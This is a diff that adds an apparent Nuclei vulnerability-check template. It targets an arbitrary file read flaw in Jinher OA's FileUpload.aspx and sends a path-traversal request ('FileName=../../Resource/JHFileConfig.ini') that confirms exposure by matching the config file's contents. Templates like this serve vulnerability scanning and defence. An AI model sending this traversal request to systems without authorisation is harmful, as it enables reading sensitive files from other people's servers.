@@ -1,0 +1,36 @@
+id: poc-yaml-jinher-fileupload-aspx-anyfile-read
+
+info:
+  name: 金和OA FileUpload.aspx 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/jhsoft.wcf/functionnew/FileUpload.aspx?FileName=../../Resource/JHFileConfig.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[JHFile]"
+          - "FolderTotal="
+        part: body
+      - type: word
+        words:
+          - "filename="
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
